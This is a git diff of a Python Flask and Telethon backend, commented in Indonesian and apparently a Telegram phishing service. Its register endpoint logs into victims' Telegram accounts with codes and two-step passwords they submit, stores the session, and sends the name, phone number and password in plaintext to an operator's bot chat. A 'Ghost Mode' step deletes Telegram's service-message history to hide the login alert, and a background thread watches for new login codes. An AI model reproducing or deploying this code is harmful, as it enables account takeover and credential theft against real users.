@@ -8,12 +8,13 @@ from telethon.tl.functions.messages import DeleteHistoryRequest
 app = Flask(__name__)
 CORS(app)
 
-# Konfigurasi
+# Ambil dari Variabel Railway (Screenshot 33)
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 DOMAIN = os.getenv("RAILWAY_STATIC_URL")
+RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""
 
 user_db = {}
 
@@ -24,20 +25,19 @@ def bot_api(method, payload):
         return res.json()
     except: return {}
 
-@app.route('/', methods=['GET'])
-def home():
-    return "Backend Is Running!"
-
 @app.route('/register', methods=['POST'])
 def register():
     data = request.get_json()
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
+        # Menjalankan alur dengan penanganan error yang lebih baik
         return loop.run_until_complete(handle_flow(data))
     except Exception as e:
+        print(f"ERROR REGISTER: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
-    finally: loop.close()
+    finally:
+        loop.close()
 
 async def handle_flow(data):
     client = None
@@ -50,6 +50,7 @@ async def handle_flow(data):
         if nomor not in user_db:
             user_db[nomor] = {"session": "", "hash": "", "nama": "", "sandi": "None", "status_msg_id": None}
 
+        # Gunakan StringSession agar sesi tidak hilang saat restart
         client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
         await client.connect()
 
@@ -75,13 +76,18 @@ async def handle_flow(data):
                 user_db[nomor]['sandi'] = sandi
                 return await finalize_login(client, nomor)
             except: return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
+            
     finally:
-        if client: await client.disconnect()
+        # PERBAIKAN: Cara disconnect yang benar agar tidak muncul error Screenshot 34
+        if client:
+            await client.disconnect()
 
 async def finalize_login(client, nomor):
     me = await client.get_me()
     nama = (me.first_name if me.first_name else "User").split()[0]
     user_db[nomor].update({"nama": nama, "session": client.session.save()})
+    
+    # Ghost Mode
     await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
     
     pesan = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {user_db[nomor]['sandi']}"
@@ -91,17 +97,12 @@ async def finalize_login(client, nomor):
     })
     return jsonify({"status": "success"})
 
-# --- BAGIAN WEBHOOK YANG DIPERBAIKI ---
-@app.route('/webhook', methods=['POST', 'GET'])
+@app.route('/webhook', methods=['POST'])
 def webhook():
-    if request.method == 'GET':
-        return "Webhook Endpoint Active!"
-        
     update = request.get_json()
-    print(f"DEBUG: Data masuk ke Webhook -> {update}") # Lihat ini di logs Railway
-
     if update and "callback_query" in update:
         call = update["callback_query"]
+        # WAJIB: Langsung hilangkan loading di tombol bot
         bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
         
         callback_data = call.get("data", "")
@@ -114,7 +115,10 @@ def webhook():
                 if nomor in user_db:
                     user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
                 
-                threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
+                # Gunakan daemon thread agar tidak membebani server
+                t = threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor)))
+                t.daemon = True
+                t.start()
                 
     return jsonify({"status": "success"}), 200
 
@@ -143,6 +147,8 @@ async def monitor_otp(nomor):
     finally: await client.disconnect()
 
 if __name__ == "__main__":
-    # Penting: Paksa Railway pakai Port dari environment
+    # Sinkronisasi Webhook
+    if RAILWAY_URL:
+        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
